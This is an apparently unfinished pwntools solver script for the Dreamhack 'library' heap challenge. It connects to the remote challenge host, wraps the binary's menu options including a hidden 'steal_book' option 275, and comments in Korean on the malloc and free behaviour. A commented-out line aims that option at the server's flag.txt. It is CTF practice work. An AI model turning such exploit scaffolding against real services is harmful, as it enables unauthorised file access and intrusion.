from pwn import *

p = remote('host3.dreamhack.games', 18865)
e = ELF('./library')

# listbook[booksize].contents의 malloc size가 달라진다.
def borrow_book(select, ) :
    p.sendlineafter(b'Select menu : ', b'1')
    p.sendlineafter(b'borrow? : ', str(select).encode())

# 모든 listbook[].bookname들을 읽어준다. 
# 그중 select를 해서 listbook[select].contents를 print한다.
def read_book(select) :
    p.sendlineafter(b'Select menu : ', b'2')
    p.sendlineafter(b'read? : ', str(select).encode())

# 맨 마지막에 있는 listbook[booksize-1]의 contents를 free해준다.
# 그리고 bookname도 returned로 수정한다.
def return_book() :
    p.sendlineafter(b'Select menu : ', b'3')

def good_bye() :
    p.sendlineafter(b'Select menu : ', b'4')

# buf를 open한다. 
def steal_book(buf, pages) :
    p.sendlineafter(b'Select menu : ', b'275')
    p.sendlineafter(b'book? : ', buf)
    p.sendlineafter(b'(MAX 400) : ', str(pages).encode())

# flag_file = b'/home/pwnlibrary/flag.txt'

# p.steal_book(flag_file, 1)

p.interactive()